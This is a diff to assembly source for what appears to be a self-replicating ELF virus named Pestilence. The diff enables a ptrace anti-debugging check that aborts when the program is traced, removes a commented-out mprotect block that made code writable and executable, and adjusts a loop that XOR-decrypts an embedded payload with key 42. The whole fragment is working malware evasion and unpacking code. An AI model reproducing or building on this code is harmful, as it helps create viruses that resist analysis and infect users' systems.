@@ -107,27 +107,16 @@ _start:
 	sub  rsp, PESTILENCE_STACK_SIZE                    ; Reserve some espace in the register r15 to store all the data needed by the program
 	mov r15, rsp
 
-; _ptrace_anti_debug:
-; 	mov rdi, PTRACE_TRACEME
-; 	mov rsi, SELF_PID
-; 	lea rdx, 1
-; 	mov r10, 0
-; 	mov rax, SYS_PTRACE
-; 	syscall
+_ptrace_anti_debug:
+	mov rdi, PTRACE_TRACEME
+	mov rsi, SELF_PID
+	lea rdx, 1
+	mov r10, 0
+	mov rax, SYS_PTRACE
+	syscall
 
-; 	cmp rax, 0
-; 	jl _end
-; _mprotect:
-; 	lea rdi, [rel _start]
-; 	mov rsi, _stop - _start
-; 	mov r10, rdi
-; 	and rdi, -0x1000 ; 4096 
-; 	neg rdi
-; 	add r10, rdi
-; 	neg rdi
-; 	mov rdx, 7 ; PROT_READ | PROT_WRITE | PROT_EXEC
-; 	mov rax, SYS_MPROTECT
-; 	syscall
+	cmp rax, 0
+	jl _end
 
 	mov rax, SYS_GETGID
 	syscall
@@ -160,13 +149,11 @@ _decypher:
 		pop rbp
 		sub rbp, .get_rip
 	.loop:
-		lea r10, [rbp + _payload] ; (rbp + (payload - start ) )
+		lea r10, [rbp + _payload]
 		xor byte [r10 + r8], 42
 		inc r8
 		cmp r8, rdx
 		jl .loop
-	mov rax , SYS_GETUID
-	syscall
 	nop
 	nop
 	nop
